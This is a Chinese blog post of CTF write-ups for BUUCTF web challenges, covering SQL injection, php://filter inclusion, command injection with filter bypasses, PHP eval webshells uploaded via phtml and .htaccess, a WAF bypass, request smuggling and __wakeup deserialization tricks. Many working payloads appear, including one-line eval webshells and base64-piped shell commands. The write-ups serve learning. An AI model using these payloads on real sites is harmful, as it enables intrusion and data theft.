---
title: BUUCTF web刷题记录 WP
date: 2022-3-29 19:51:23
tags:  CTF,比赛
category: CTF
---

## [SUCTF 2019]EasySQL

> [参考博客园WP1+常见sql_mode介绍](https://www.cnblogs.com/gtx690/p/13176458.html)
>
> [CSDN WP2](https://blog.csdn.net/RABCDXB/article/details/111398725)
>
> [在线mysql执行🔗](http://mysql.jsrun.net/)
>
> [在线mysql执行2🔗](https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088)

- <span style="background:#ffbbff;">**知识点：**</span>

```
堆叠查询

后端代码猜测

1 || ** ，||双作用

set sql_mode = pipes_as_concat 命令理解（为什么没有过滤set、concat的原因）
```



万能密码' or '1'='1发现waf

尝试堆叠注入

输入query=1;select 2;返回Array ( [0] => 1 ) Array ( [0] => 2 )，

query=1;select database();返回Array ( [0] => 1 ) Array ( [0] => ctf )，得到数据库：ctf，

query=1;show tables;返回Array ( [0] => 1 ) Array ( [0] => Flag )，得到表Flag 

- 获取数据表结构:

  desc 表名;

  show columns from 表名;

但是都被拦截，估计过滤了关键词flag



> [mysql运算符](https://www.runoob.com/mysql/mysql-operator.html)

mysq里逻辑运算符：与：and，或：or、||，非：not、！，异或：xor

**单个|是按位或运算符，&是按位与，^是按位异或**

运算符优先级：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126153927429.png" alt="image-20220126153927429" style="zoom: 50%;" />



### ||双作用：或、连接

1. 逻辑或

本地测试

```
SELECT 'a'||'flag'; //0
SELECT 1||'flag'; //1
SELECT 0||'flag'; //0
SELECT 0||id from student;  //1 student表里有id列名
SELECT 0||'id' from student;  //0
SELECT 1||'id' from student;  //1
```

\==》==逻辑或（or），只要||前后是存在的字段名或着非0的数，就判定正确==



2. 连接符，类似concat函数

**sql_mode=pipes_as_concat**：把||当成字符串连接符而非逻辑或运算，==若拼接的是列名，则会显示查询结果再拼接==

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160732988.png" alt="image-20220126160732988" style="zoom:50%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160820866.png" alt="image-20220126160820866" style="zoom:50%;" />



猜测：

> **这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，==通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||==，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用**

关键，执行的sql语句是

```
$sql = "select ".$post['query']."||flag from Flag";
$sql = "select xxx ||flag from Flag";
```



解法1：

`*,1`

```
select *,1 ||flag from Flag;
即select *,1 from Flag;
即查出了Flag表中的所有内容+新增一列全1
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163149707.png" alt="image-20220126163149707" style="zoom:80%;" />

解法2：

`1;set sql_mode=pipes_as_concat;select 1`

```
select 1;set sql_mode=pipes_as_concat;select 1 ||flag from Flag;
执行两次查询，后一次select 1 ||flag from Flag;即把select flag from Flag;的结果和1拼接生成新一列
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163217854.png" alt="image-20220126163217854" style="zoom:80%;" />

[源码](http://www.xianxianlabs.com/blog/2020/05/27/355.html)，发现也是multi_query()执行多条语句产生的漏洞



## [极客大挑战 2019]Secret File

### <span style="background:#ffbbff;">考点：文件包含、伪协议</span>

1. 点击超链接跳转到Archive_room.php，点击secret超链接发现秒跳转到end.php，而不显示secret超链接的文件action.php，用burpshuite抓包，得到提示内容

![image-20220127161616536](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127161616536.png)

2. 访问secr3t.php，发现源码

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

文件包含，利用伪协议读取文件，发现过滤了php://input、data://，也不能用截断

![伪协议总结](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/15063209941952.png)

php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然**会直接当做php代码执行，看不到源代码内容**（file=flag.php）

payload：

```
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

读取flag.php源码，解密得到flag

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127162708933.png" alt="image-20220127162708933" style="zoom:50%;" />



## [极客大挑战 2019]LoveSQL

#### <span style="background:#ffbbff;">考点：手注字符注入</span>

输入'回显报错提示==》有字符注入

![image-20220127164535555](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164535555.png)

输入万能密码，得到提示admin+密码：f3dd35cabf06e25a413446369583a7b8，尝试登陆无果

![image-20220127164411998](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164411998.png)

'后加#就不会报错，注释：

```
输入框的时候用#，在地址栏/hackbar的时候使用%23
```



判断列数：

```
check.php?username=admin&password=1'order by 4%23 //报错
check.php?username=admin&password=1'order by 3%23  //不报错，说明有三列
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164914313.png" alt="image-20220127164914313" style="zoom:50%;" />

判断回显位置：

```
check.php?username=admin&password=1'union select 1,2,3%23  //回显在2，3处
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164929580.png" alt="image-20220127164929580" style="zoom:50%;" />

爆库名

```
1'union select 1,database(),3%23  //geek
```



爆当前库下表名

```
1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23  //geekuser,l0ve1ysq1
```



爆当前库下所有列名

```
1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()%23  //id,username,password,id,username,password
```



爆指定库字段

```
1'union select 1,2,group_concat(concat_ws('--',id,username,password)) from l0ve1ysq1%23
```

1--cl4y--wo_tai_nan_le,2--glzjin--glzjin_wants_a_girlfriend,3--Z4cHAr7zCr--biao_ge_dddd_hm,4--0xC4m3l--linux_chuang_shi_ren,5--Ayrain--a_rua_rain,6--Akko--yan_shi_fu_de_mao_bo_he,7--fouc5--cl4y,8--fouc5--di_2_kuai_fu_ji,9--fouc5--di_3_kuai_fu_ji,10--fouc5--di_4_kuai_fu_ji,11--fouc5--di_5_kuai_fu_ji,12--fouc5--di_6_kuai_fu_ji,13--fouc5--di_7_kuai_fu_ji,14--fouc5--di_8_kuai_fu_ji,15--leixiao--Syc_san_da_hacker,16--flag--flag{03addeba-bef3-4821-86bd-04c7690ea3a6}

得到flag



## [GXYCTF2019]Ping Ping Ping

### 考点：命令执行、过滤绕过、变量拼接

> [参考WP](https://www.cnblogs.com/Cl0ud/p/12313368.html)
>
> [个人博客，有各种绕过过滤方法，关键词**](https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/)
>
> 

1. 执行多条bash语句：

```
;
|   //前面的输出作为后面的输入，被吞掉
&
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121137143.png" alt="image-20220130121137143" style="zoom: 67%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121159304.png" alt="image-20220130121159304" style="zoom: 67%;" />

2. 发现空格被过滤，绕过方法：

```
{cat,flag.txt} 
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
kg=$'\x20flag.txt'&&cat$kg
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)
```



3. 发现关键词flag被过滤

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121238751.png" alt="image-20220130121238751" style="zoom:67%;" />

先查看index.php`/?ip=127.0.0.1;cat$IFS$9index.php`

得到index.php源码

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
      //$/?*<>'"\()[]{}\x00-\x1f	
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

[正则相关知识：](https://www.cnblogs.com/kenshinobiy/p/4443600.html)

```
一个点‘.’可以代表所有的单一字符

*紧跟的一个字符的zero or more

字符‘|’相当于OR 操作："(b│cd)ef": 匹配含有 "bef" 或者 "cdef"的字符串;

中括号[xxx]括住的内容只匹配一个单一的字符:"^[a-zA-Z]": 匹配以字母开头的字符串;"[a-d]": 匹配'a' 到'd'的单个字符 (和"a│b│c│d" 还有 "[abcd]"效果一样);

```



4. ==flag被过滤，绕过方法：==

```
拼接绕过:a=l;b=s;$a$b
编码绕过：
base64：
echo “Y2F0IC9mbGFn”|base64-d|bash
==>cat /flag
hex：
echo “636174202f666c6167” | xxd -r -p|bash
==>cat /flag
oct：
$(printf “\154\163”)
==>ls
```

payload1：变量拼接：

 在flag贪婪匹配里面我们不将flag连着写，就不会匹配到，同时可以看到有$a变量，尝试覆盖它

```
?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php
?ip=127.0.0.1;b=g;cat$IFS$9fla$b.php
```



payload2：过滤bash，就用sh，sh的大部分脚本都可以在bash下运行。

```
bash：
echo "Y2F0IGZsYWcucGhw"| base64 -d | bash  //发现被过滤
sh：
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //成功
Y2F0IGZsYWcucGhw：cat flag.php
```



#### “奇淫技巧”：内联执行

内联，就是将反引号内命令的输出作为输入执行。

秒题大概就是这种做法吧......

==**payload3：内联绕过，无需列出中间结果，可以一次输出多个文件内容**==

```
?ip=;cat$IFS`ls`
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130123618657.png" alt="image-20220130123618657" style="zoom:67%;" />

## [极客大挑战 2019]Knife

### 考点：eval代码执行

eval($_POST["Syc"]);

**运用eval()要注意几点:**

- eval函数的==参数的字符串末尾一定要有分号==
- **eval()** 返回 **`NULL`**，不回显，得有echo才回显

payload

```
Syc=echo  `ls`;   //看源码，发现只有index.php
Syc=echo  `ls /`;  //看根目录，发现flag文件
Syc=echo  `cat /flag`; //得到flag
```



## [极客大挑战 2019]Http

### 考http，大概率考http请求体header的用法

可以用burpsuite/浏览器hackbar直接加



1. 访问网站，查看源码发现跳转文件secret.php

![image-20220130133859973](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130133859973.png)

2. 网页显示It doesn't come from 'https://Sycsecret.buuoj.cn'提示不是从某网站跳转过来的==》修改Referer:https://www.Sycsecret.com

3. Please use "Syclover" browser  ==》修改User-Agent:Syclover
4. No!!! you can only read this locally!!!  ==》要从本地访问\==》修改X-Forwarded-For:127.0.0.1

![image-20220130134240237](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130134240237.png)

## [极客大挑战 2019]Upload

### 考点：<?、图片头绕过、php可解析后缀、上传位置

查看源码，关键源码

```html
	<form action="upload_file.php" method="post" enctype="multipart/form-data">
	</br></br></br></br></br></br></br></br></br></br></br></br></br></br></br>
    	<div align="center">  
    		<label for="file" style="font:20px Georgia,serif;">图片：</label>
    		<input type="file" name="file" id="file" >
   			<input type="submit" name="submit" value="提交" class="button">
   		</div>
	</form>
```

#### html知识

***div标签定义 HTML 文档中的分隔（DIVision）或部分（section），表示一块***

***align是对齐属性，center：居中对齐***

***action 属性规定当提交表单时，向何处发送表单数据。***

上传文件到upload_file.php，文件表单名叫file



1. 试试上传一句话木马shell.php，发现不行，返回Not image!，前端对后缀名有限制

```
Content-Type: application/octet-stream
<?php @eval($_POST['shell']);?>
```

2. 改成shell.php.jpg也不行，改mime:image/jpeg也不行，说明后端对文件头有限制

3. 上传图片马，发现对<?有过滤

   - **==标签绕过==**：`<script language=php> eval($_POST['c']);</script>`

   - ```
     标准标签：<?php
     简写标签  <?=    它是 <?php echo 的简写形式,（无需闭合尾巴）
     短标记(<? xxx ?>)，需开启([short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag)in php.ini)
     asp标签(<%xxx%>)【禁用了<?、 <?php、 ?>时】需开启（asp_tags）
     <script language=php>echo  ‘123’;</script> 这里不存在<?，可以绕过正则对<? ,<?php，asp的限制
     注意⚠️php>7废除了asp标签和script标签
     ```

4. 成功上传shell.jpg，但怎么让他解析呢?此法不行，后面上传.htaccess也不行，必须内容是图片开头，说明还是后缀解析问题
5. <span style="background:#bbffff;">**默认后缀php解析**</span>

```
⚠默认后缀解析
    phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀
php2, php3, php4, php5, phps, pht, phtm, phtml
```

修改后缀php2，php3.。都不行

**修改上传文件的类型为phtml，只有这样才能使网页后端执行我们的一句话木马**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230412016.png" alt="image-20220213230412016" style="zoom:67%;" />



精简版：

**这题的绕过点有三个，一个就是文件内容不能有<?，还有就是文件后缀的绕过，还有图片头。**

```
GIF89a? <script language="php">eval($_POST[c])</script>
```

还有一个问题就是**上传之后的文件在哪**。**<span style="background:#FF9999;">猜测还是常规的目录/upload下面</span>**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230719900.png" alt="image-20220213230719900" style="zoom:50%;" />

访问11.phtml失败，说明位置不对，GET访问upload/11.phtml成功，显示图片源码

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224630667.png" alt="image-20220213224630667" style="zoom: 50%;" />

POST访问，成功

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224720182.png" alt="image-20220213224720182" style="zoom: 50%;" />

payload：POST：upload/11.phtml，POST：

```
c=echo `cat /flag`;
```





## [ACTF2020 新生赛]Upload

### 考点：php常见后缀解析绕过

> [参考WP](https://www.cnblogs.com/yesec/p/12403922.html)

查看源码

```html
 <div class="light"><span class="glow">
			<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
				嘿伙计，你发现它了！
                <input class="input_file" type="file" name="upload_file"/>
                <input class="button" type="submit" name="submit" value="upload"/>
            </form>
      </span><span class="flare"></span><div>
```

***[onsubmit](https://blog.csdn.net/YoungStar70/article/details/64934435)表示表单提交时验证的事件,它是在表单中的确认按钮被点击时出发的，一般是js函数，函数返回其他值/不返回表单内容才能提交，函数返回false表单不会提交***（[百度知道](https://zhidao.baidu.com/question/111968742.html)）



前端对文件后缀有限制，审查元素删掉也不行

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214154853790.png" alt="image-20220214154853790" style="zoom: 50%;" />

上传图片马，发现对上传后的文件重命名了

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214155009513.png" alt="image-20220214155009513" style="zoom: 67%;" />

直接访问，发现是图片

修改后缀名为11.phtml，上传成功，访问网页成功解析php

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163807480.png" alt="image-20220214163807480" style="zoom:67%;" />

POST访问uplo4d/87226c8336e7d8806fd8d3324fbcda6b.phtml

```
c=echo `cat  /flag`;
```

得到flag

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163848001.png" alt="image-20220214163848001" style="zoom: 50%;" />



蚁剑连接后查看源码：

```php
<?php
    error_reporting(0);
    //设置上传目录
    define("UPLOAD_PATH", "./uplo4d");
    $msg = "Upload Success!";
    if (isset($_POST['submit'])) {
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $file_name = $_FILES['upload_file']['name'];
        $ext = pathinfo($file_name,PATHINFO_EXTENSION);  //规定新的文件后缀名为源文件后缀名
        if(in_array($ext, ['php', 'php3', 'php4', 'php5'])) {   //这里不出所料,过滤了常见的php文件拓展名
            exit('nonono~ Bad file！');
        }

        $new_file_name = md5($file_name).".".$ext;    //新的文件名为md5值加上后缀名
        $img_path = UPLOAD_PATH . '/' . $new_file_name;


        if (move_uploaded_file($temp_file, $img_path)){
            $is_upload = true;
        } else {
            $msg = 'Upload Failed!';
        }
        echo '<div style="color:#F00">'.$msg." Look here~ ".$img_path."</div>";
    }
?>
```

> ***[pathinfo()](https://www.runoob.com/php/func-filesystem-pathinfo.html) 函数以数组的形式返回关于文件路径的信息。***
>
> 语法：pathinfo(path,options)，opyions里的PATHINFO_EXTENSION - 只返回 extension

从源码中可以看出只对上传后的文件更名并移到upload目录下，并没有删除





#### 总结一下CTF文件上传题中常见考点

- 利用中间件解析漏洞绕过检查，实战常用
- 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析
- %00截断绕过
- php3后缀解析
- php4文件
- php5文件
- php7文件
- phtml文件
- phps文件
- pht文件



## [MRCTF2020]你传你🐎呢

### 考点：.htaccess、mime+后缀

上传一句话，图片马都不行，后端验证

那就上传.htaccess文件，**==修改mime为 image/jpeg==**，发现成功上传，这样就可以让 **jpg** 解析为 **php** 

> **[htaccess](https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html)文件是Apache服务器中的一个配置文件，它负责所在目录下的网页解析配置**
>
> **.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，且子目录中的指令会覆盖父目录或者主配置文件中的指令**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214174709873.png" alt="image-20220214174709873" style="zoom:67%;" />

上传一个一句话木马php文件

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175230427.png" alt="image-20220214175230427" style="zoom: 80%;" />

修改后缀、mime，成功上传

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175305517.png" alt="image-20220214175305517" style="zoom:67%;" />

成功访问

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175337259.png" alt="image-20220214175337259" style="zoom: 50%;" />

蚁剑连接得到flag，不知道为啥直接hackbar shell=echo \`cat /flag\` 不行

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175930523.png" alt="image-20220214175930523" style="zoom:67%;" />

源码分析，对后缀有限制：含ph就不行，对文件类型即mime有限制，得是image类，对大小也有限制，然后就直接输出文件内容，把上传的文件移动到新目录下

```php
<?php
session_start();
echo "<meta charset=\"utf-8\">";
if(!isset($_SESSION['user'])){
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000));
}
if(isset($_FILES['uploaded'])) {
    $target_path  = getcwd() . "/upload/" . md5($_SESSION['user']);  //getcwd在这里是/var/www/html
    $t_path = $target_path . "/" . basename($_FILES['uploaded']['name']); //$t_path是/var/www/html+md5+文件名
    $uploaded_name = $_FILES['uploaded']['name'];  //文件全名，包含后缀
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,'.') + 1);  //后缀为最后一个点后面的
    $uploaded_size = $_FILES['uploaded']['size'];
    $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];
 
    if(preg_match("/ph/i", strtolower($uploaded_ext))){  //不区分大小写，遇到含ph的后缀就die
        die("我扌your problem?");
    }
    else{
        if ((($_FILES["uploaded"]["type"] == "
            ") || ($_FILES["uploaded"]["type"] == "image/jpeg") || ($_FILES["uploaded"]["type"] == "image/pjpeg")|| ($_FILES["uploaded"]["type"] == "image/png")) && ($_FILES["uploaded"]["size"] < 2048)){
            $content = file_get_contents($uploaded_tmp);  //输出临时文件内容
			mkdir(iconv("UTF-8", "GBK", $target_path), 0777, true);
			move_uploaded_file($uploaded_tmp, $t_path);  //移动临时文件到/var/www/html+md5+文件
			echo "{$t_path} succesfully uploaded!";
        }
        else{
            die("我扌your problem?");
        }
    }
}
?>
```

getcwd():获取当前目录，在这里是/var/www/html

getcwd()返回URL中引用的“main”脚本的路径。

dirname(__FILE__)将返回当前执行脚本的路径。

**[basename()](https://www.php.cn/php-weizijiaocheng-415346.html)函数用于返回文件路径中的文件名部分**

- $file = "/phpstudy/WWW/index.php";

- echo basename($file);//带有文件扩展名  index.php
- echo basename($file,'.php'); //去除文件扩展名  index

strrpos() 函数查找字符串在另一字符串中**最后一次**出现的位置（区分大小写）

strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）

substr() 函数返回字符串第二个参数开始（包括）的后半部分。

文件上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。





## [RoarCTF 2019]Easy Calc

### 考点：php+waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii

> [csdn wp](https://blog.csdn.net/weixin_44077544/article/details/102630714)
>
> [参考个人博客wp](https://www.cnblogs.com/chrysanthemum/p/11757363.html)

输入字符被403

**返回403？一般都是PHP过滤的。这里403.应该就是题目说的WAF了**
**那么整个处理流程应该是。前端服务器WAF过滤。->后端PHP黑名单过滤**

查看源码

```javascript
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()), //获取标签的值并进行url编码
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```

calc.php?num=”+encodeURIComponent($(“#content”).val()是什么意思？

("#content")相当于document.getElementById("content");获取id为content的HTML标签元素

而(“#content”).val() 相当于document.getElementById(“content”).value;获取id为content的HTML标签元素的值

encodeURIComponent(str);将字符串url编码

访问calc.php

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);  //num没有值就返回calc源码
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');  //已有echo
}
?>
```

正则表达式模式修饰符 m：多行匹配，不受\n影响

尝试字母，forbidden，**特殊字符好像就直接页面错误，，这应该是waf！！！**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214213717838.png" alt="image-20220214213717838" style="zoom:67%;" />

#### PHP的字符串解析特性

1. 我们知道PHP将查询字符串（在URL或正文中）转换为内部`$_GET`或的关联数组`$_POST`。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。

2. 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：`/news.php?%20news[id%00=42"+AND+1=0–`(**waf识别出参数是%20news[id%00而不是目标参数而不去拦截，实际到php那里，参数是news_id**)

3. php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

```
1.删除空白符

2.将某些字符转换为下划线（包括空格）
```

4. 那么如果waf不允许num变量传递字母：

```
http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
```

那么我们可以在num前加个空格：

```
http://www.xxx.com/index.php? num = aaaa
```

waf以为是 num参数而不去拦截，而php解析出num参数赋值

、==》成功绕过waf

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214215614832.png" alt="image-20220214215614832" style="zoom:67%;" />

scandir()：函数返回一个数组，其中包含指定路径中的文件和目录，不会回显

==需要配合**print_r**或**var_dump**输出数组==

**由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取**【/的ASCII:47】

payload：

1. 读取根目录

```
/calc.php? num=print_r(scandir(chr(47)));    
```

![image-20220214230658219](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214230658219.png)

2. 读取flag？屏蔽了``，不能命令执行，php读文件函数：**file_get_contents**

- ***file_get_contents() 把整个文件内容读入一个字符串中。<span style="background:#FF9999;">函数返回读取到的数据，</span>***，而原php代码已有echo，无需再打印
- **PHP使用 标准的 点 连接符拼接**
- payload:

```
/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));
/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));
即file_get_contents(/f1agg)
```



或者

scandir可以用base_convert函数构造，但是利用base_convert只能解决`a~z`的利用，因为根目录需要/符号，且不在`a~z`,所以需要hex2bin(dechex(47))这种构造方式，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为 ASCII字符,用readfile读取文件

- ***readfile()函数: 输出一个文件。**
  **该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。***

payload:

```
base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))
即readfile(/f1agg)
```



Q1：其他的函数如system执行系统命令可以吗？不行，因为phpinfo里可以看到禁用了**system、exec 这一类命令执行的函数**

![image-20220214232523093](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214232523093.png)



#### Q2：HTTP走私攻击

> [**协议层的攻击——HTTP请求走私，seebug介绍](https://paper.seebug.org/1048/)
>
> [相关WP1](https://mayi077.gitee.io/2020/01/24/RoarCTF-2019-Easy-Calc/)
>
> [WP2](https://guokeya.github.io/post/4e7t6Raji/)
>
> [**各分类介绍和例题](https://guokeya.github.io/post/AQdKm74xy/)

**TE-CL**

前端根据TE来解析。所有请求都被算上了
后端根据CL来解析。22\r\n被解析。GET /admin就成了新的请求

![](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/1579173913376.png)

**CL-CL**

当代理服务器和后端服务器接收多个CL。返回400错误。代理服务器使用第一个CL处理数据。后端服务器使用第二个CL处理数据【**数据到达服务器端**】

这里GET/POST都可以

![](https://guokeya.github.io/post-images/1579177518794.png)

![大佬图片](https://pic.downk.cc/item/5e2968b82fb38b8c3c43771b.jpg)

CL-CL：在这题大概意思是一个消息同时加上两个Content-Length，POST请求+GET请求url参数，会导致400报错，前端接受的是POST请求，但是get请求到了后端，服务器端会回显get结果



Q3:字符串转ASCII，php：不能直接转，除非工具，需要挨个字符转，chr()，再`.`连接起来

> https://evilcos.me/lab/xssor/

先转10en，再替换,为).chr(





## [极客大挑战 2019]PHP

### 考点：备份、php反序列化、跳过__wakeup()

<span style="background:#FF9999;">属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</span>

提示网站备份，访问www.zip，得到源码和假flag

[dirsearch](https://blog.csdn.net/qq_35599248/article/details/119396936)参数解析

```
-i         保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)
-w,--wordlists              自定义wordlist(以逗号分隔
-e,--extensions             包含的文件拓展名(逗号分隔) /指定网站语言  如-e php,asp
-u,--url                    目标url
```

index.php关键php：

```php
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);   //①  res为对象
    ?>
```

反序列化：new创造对象时触发construct构造函数，unserialize时触发wakeup，结束后触发destruct析构函数

class.php:

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){    //②
        $this->username = 'guest';
    }
    function __destruct(){   //③
        if ($this->password != 100) {  //绕过这里
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {   //关键点  ④
            global $flag;  //可以变量覆盖
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```

关键：

```
不满足$this->password != 100
满足$this->username === 'admin'
但是第②步的时候username被初始化变为了guest
```

**问题就来了，在反序列化的时候会首先执行**`__wakeup()`**魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过**`__wakeup()`**，而去执行**`__destruct`——==属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行==

构造序列化：最完整：

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));
?>
```

private版执行结果

```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
修改属性个数：
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

简洁:

```php
<?php
class Name{
	public $username='admin';
	public $password= 100;
} 
$flag = new Name();
$flag_1 = serialize($flag);
echo $flag_1;
?>
```

简洁版执行结果：

```
O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";i:100;}
修改属性个数：
O:4:"Name":3:{s:8:"username";s:5:"admin";s:8:"password";i:100;}
```

但还是不行/???

#### private

private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见

